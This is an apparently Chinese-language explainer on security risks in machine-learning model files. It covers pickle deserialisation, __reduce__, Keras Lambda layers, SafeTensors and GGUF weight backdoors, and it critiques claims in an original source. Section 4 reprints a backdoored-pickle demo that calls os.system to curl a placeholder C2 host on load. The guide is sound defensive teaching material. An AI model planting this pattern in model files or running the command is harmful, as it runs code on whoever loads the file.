## ⚡ 30 秒速览

**模型文件不一定只是数字。某些格式可以携带对象重建逻辑。**

| 风险层次 | 触发时机 | 重点 |
| --- | --- | --- |
| 恶意 pickle 重建逻辑 | 不安全反序列化时 | 可能执行系统命令 |
| 不可信模型架构或自定义层 | 依加载方式与代码而定 | 可能运行自定义计算或代码 |
| 权重中的行为后门 | 遇到特定推理输入时 | 可能出现预设异常输出 |

**先记住：文件格式安全，不等于模型行为可信。**

## 1. 什么是序列化？

像打包行李一样：把内存中的 Python 对象转成可以保存的文件。

- **Serialisation：** 对象 → 文件。
- **Deserialisation：** 文件 → 对象。

PyTorch、scikit-learn 等框架会保存训练结果，便于之后恢复而不必重新训练。

原文用 `.pkl`、`.pt` 介绍 pickle。**扩展名只是线索，不能单凭后缀确定具体内容和加载安全性。**

## 2. Pickle：Python 的对象保存机制

Pickle 可以表示字典、列表、类实例以及一些可引用的函数等对象。

### 原文的普通保存与加载示例

```python
import pickle

model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)
```

| 部分 | 用途 |
| --- | --- |
| `pickle.dump()` | 将对象写入文件 |
| `pickle.load()` | 读取文件并重建对象 |
| `wb` | 二进制写入 |
| `rb` | 二进制读取 |

**这里只应理解自己创建的可信示例。不要用 `pickle.load()` 检查未知模型是否安全。**

## 3. `__reduce__` 为什么重要？

在自定义对象的序列化机制中，`__reduce__` 可以提供之后重建对象所需的信息。

常见形式是：

```text
(callable, arguments)
```

即：重建时调用哪个函数，传入什么参数。

**危险在于：** 不受限制的 pickle 加载器可能按文件指示调用具有系统操作能力的函数，而非仅恢复权重。

原文用 `__reduce__` 解释此机制；Python 也有其他序列化钩子，并非每个对象保存时都只经过这个方法。

## 4. 原文恶意文件示例：加载时发起网络请求

以下保留原文演示代码，不执行、不访问示例地址：

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() will call os.system() with this command
        return (os.system, ("curl http://c2.example.com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

### 分三步理解

1. `pickle.dump()` 保存对象的重建指令。
2. 指令指定 `os.system` 和一个命令字符串。
3. 若随后使用不受限制的加载方式重建对象，命令就可能被执行。

**攻击触发点是加载，不是必须先调用模型预测。**

原文也将风险关联到 `torch.load()`。实际行为取决于 PyTorch 版本、参数及文件类型，不能理解为所有当前调用都会无条件执行任意 pickle 代码。

## 5. 执行能力可能造成什么影响？

| 原文载荷类型 | 可能影响 |
| --- | --- |
| Reverse shell | 建立远程命令访问 |
| Data exfiltration | 获取凭据、源代码等敏感文件 |
| Crypto miner | 消耗计算资源 |
| Reconnaissance | 获取用户、主机和进程信息 |

影响取决于加载进程权限、网络连通性和环境限制，不是一个示例请求就能证明获得全部主机控制。

## 6. 架构层风险：Keras Lambda 层

**核心：** 除了加载阶段，还要考虑模型执行时发生什么。

原文介绍 Keras 的 Lambda 层：它允许在模型计算过程中加入自定义处理，例如调整数据形状。

攻击者可能把异常逻辑放进计算路径，或让特定输入触发攻击者选择的输出。**自定义代码执行与输出行为后门是相关但不同的风险。**

### 关于 SafeTensors：这里需要区分

原文称，将 `.h5` 模型转成 SafeTensors 后，Lambda 层会完整保留。这个说法不能直接照搬：

- SafeTensors 主要保存张量，不是通用 Keras 架构或 Python 函数容器。
- 只转换权重文件，不会自动审计或清理应用另外保留的架构代码。
- 权重中学到的行为后门，也可能随权重转换继续存在。

**因此，不能说 Lambda 代码被原样存进 SafeTensors；应问模型运行时是否仍使用原来的不可信架构。**

### 原文比较的学习版

| 问题 | Pickle 重建载荷 | 架构或权重层风险 |
| --- | --- | --- |
| 主要关注何时？ | 不安全加载时 | 加载自定义代码时或推理时 |
| 换成纯张量格式就解决了吗？ | 可避开该文件中的 pickle 重建路径 | 不自动解决外部架构代码或权重后门 |
| 严重度固定吗？ | 否，取决于能力与权限 | 否，任意代码执行也可能是高影响 |

原文将后者标为 MEDIUM，但若真的能任意执行 Python，不能仅凭发生在推理阶段就认定风险较低。

## 7. GGUF 与本地大语言模型

原文介绍 GGUF：常用于本地运行的 LLaMA、Mistral、Qwen 等模型，文件经常是量化后的权重。

### 量化是什么？

用较低精度表示参数，通常减少存储与内存需求；性能与质量取决于具体模型和实现。

### 没用 pickle，为什么仍需审查？

- 不使用 pickle，不等于加载器没有其他漏洞。
- 权重里可能存在微调产生的行为后门。
- 下载他人量化的文件，增加了一个需要信任的转换者。

原文称权重后门不会出现在「任何静态扫描」中，这过于绝对。更稳妥地说：**只检查文件格式或代码特征，不能充分验证模型行为。**

### 原文建议的来源检查

核对发布者、上传时间、下载情况与校验和，优先从验证过的来源取得文件。

**注意：** 下载量不是可信保证；校验和能核对文件是否一致，也需要可信渠道提供预期值。
